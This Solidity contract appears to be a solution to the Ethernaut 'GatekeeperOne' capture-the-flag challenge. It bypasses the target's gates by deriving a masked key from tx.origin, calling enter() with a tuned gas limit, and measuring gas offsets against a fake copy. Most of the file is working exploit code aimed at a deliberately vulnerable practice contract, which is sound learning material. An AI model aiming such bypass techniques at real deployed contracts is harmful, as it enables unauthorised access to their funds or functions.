// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";
import "./GatekeeperOneFake.sol";

contract GatekeeperOneHacker {
    GatekeeperOne public gatekeeper;
    GatekeeperOneFake public fakeGatekeeper;
    uint256 constant public gasCostOfGateOne = 140;
    // event AfterGas(uint256 afterGas, uint256 beforeGas);
    constructor(address _gatekeeper, address _fakeGatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
        fakeGatekeeper = GatekeeperOneFake(_fakeGatekeeper);
    }

    function callEnter(bytes8 key, uint256 gasLimit) public returns (bool) {
        // uint256 beforeGas = gasleft();
        bool result = gatekeeper.enter{ gas: gasLimit }(key);
        // uint256 afterGas = beforeGas - gasleft();
        return result;
    }

    function checkKey(bytes8 _gateKey, address txOrigin) public pure returns (bool[3] memory) {
        return [
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            uint32(uint64(_gateKey)) == uint16(uint160(txOrigin))
        ];
    }

    function getDerivedKey(address txOrigin) public pure returns (bytes8) {
        return bytes8(uint64(uint160(txOrigin))) & 0xFFFFFFFF0000FFFF;
    }

    function measureGateOneOffset() external view returns (uint256) {
        uint256 startGas = gasleft();
        // Only call the gateOne modifier logic
        require(msg.sender != tx.origin, "Failed gate 1");
        uint256 used = startGas - gasleft();
        return used;
    }

    function checkGateOneGas() external view returns (uint256) {
        // This function checks the gas left after calling gateOne
        return fakeGatekeeper.checkGateOne{gas: 1000000}();
    }


    // function eip150Check() external returns (uint256) {
    //     uint256 before = gasleft();
    //     (bool success,) = address(this).call{gas: before}(abi.encodeWithSignature("dummy()"));
    //     return before - gasleft(); // should be roughly before/64 if EIP-150 applies
    // }

    // function dummy() external {}
}